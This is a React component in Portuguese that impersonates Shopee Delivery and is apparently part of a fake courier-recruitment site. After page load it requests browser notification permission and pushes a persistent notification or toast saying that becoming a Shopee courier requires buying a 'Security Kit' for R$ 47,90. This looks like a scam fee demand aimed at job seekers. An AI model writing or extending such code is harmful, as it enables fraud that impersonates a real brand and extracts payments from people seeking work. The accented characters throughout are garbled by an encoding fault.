import React, { useEffect, useState } from 'react';
import { useToast } from '@/hooks/use-toast';
import { AlertTriangle } from 'lucide-react';

const PWANotification: React.FC = () => {
  const { toast } = useToast();
  const [hasShownNotification, setHasShownNotification] = useState(false);

  // Fun√ß√£o para solicitar permiss√£o e enviar notifica√ß√£o nativa
  const requestNotificationPermission = async () => {
    if ('Notification' in window) {
      try {
        const permission = await Notification.requestPermission();
        if (permission === 'granted') {
          // Enviar notifica√ß√£o nativa
          new Notification('üì¢ Shopee Delivery - Aviso Importante', {
            body: 'Para se tornar entregador Shopee, √© necess√°rio adquirir o Kit de Seguran√ßa oficial por R$ 47,90.',
            icon: '/shopee-icon.jpg',
            badge: '/shopee-icon.jpg',
            requireInteraction: true, // Mant√©m a notifica√ß√£o at√© o usu√°rio interagir
            tag: 'shopee-payment-notification' // Evita duplicatas
          });
          console.log('‚úÖ Notifica√ß√£o push enviada com sucesso!');
        } else {
          console.log('‚ö†Ô∏è Permiss√£o para notifica√ß√µes negada, usando toast como fallback');
          // Fallback para toast se permiss√£o for negada
          showToastNotification();
        }
      } catch (error) {
        console.error('‚ùå Erro ao solicitar permiss√£o para notifica√ß√µes:', error);
        // Fallback para toast em caso de erro
        showToastNotification();
      }
    } else {
      console.log('‚ö†Ô∏è Notifica√ß√µes n√£o suportadas, usando toast');
      // Fallback para toast se notifica√ß√µes n√£o forem suportadas
      showToastNotification();
    }
  };

  // Fun√ß√£o para mostrar toast como fallback
  const showToastNotification = () => {
    toast({
      title: "üì¢ Aviso Importante",
      description: (
        <div className="flex items-start space-x-2">
          <AlertTriangle className="w-5 h-5 text-yellow-500 mt-0.5 flex-shrink-0" />
          <div>
            <p className="font-medium text-sm">Pagamento Obrigat√≥rio</p>
            <p className="text-xs text-gray-600 mt-1">
              Para se tornar entregador Shopee, √© necess√°rio adquirir o Kit de Seguran√ßa oficial por R$ 47,90.
            </p>
          </div>
        </div>
      ),
      variant: "default",
      duration: 8000, // 8 segundos
    });
  };

  useEffect(() => {
    console.log('üîç PWANotification: Iniciando verifica√ß√£o...');
    
    // Verificar se est√° rodando em modo PWA (standalone)
    const isStandalone = window.matchMedia('(display-mode: standalone)').matches;
    const isIOSStandalone = (window.navigator as any).standalone;
    const isAndroidApp = document.referrer.includes('android-app://');
    const isPWA = isStandalone || isIOSStandalone || isAndroidApp;
    
    console.log('üì± Detec√ß√£o PWA:', {
      isStandalone,
      isIOSStandalone,
      isAndroidApp,
      isPWA,
      referrer: document.referrer,
      userAgent: navigator.userAgent
    });

    // Verificar se j√° mostrou a notifica√ß√£o nesta sess√£o
    const notificationShown = sessionStorage.getItem('pwa_payment_notification_shown');
    console.log('üíæ Notifica√ß√£o j√° mostrada nesta sess√£o:', notificationShown);

    // TEMPOR√ÅRIO: Para teste, vamos mostrar sempre (remover isPWA da condi√ß√£o)
    if (!notificationShown && !hasShownNotification) {
      console.log('üîî Preparando notifica√ß√£o (modo teste - sempre exibe)...');
      
      // Aguardar um pouco para garantir que a p√°gina carregou completamente
      const timer = setTimeout(() => {
        console.log('‚è∞ Timer executado, enviando notifica√ß√£o...');
        
        // Tentar enviar notifica√ß√£o nativa primeiro
        requestNotificationPermission();
        
        // Marcar que a notifica√ß√£o foi mostrada nesta sess√£o
        sessionStorage.setItem('pwa_payment_notification_shown', 'true');
        setHasShownNotification(true);
      }, 3000); // Aguardar 3 segundos ap√≥s o carregamento

      return () => clearTimeout(timer);
    } else {
      console.log('‚ùå Notifica√ß√£o n√£o ser√° exibida:', {
        notificationShown: !!notificationShown,
        hasShownNotification
      });
    }
  }, [toast, hasShownNotification]);

  return null; // Este componente n√£o renderiza nada vis√≠vel
};

export default PWANotification;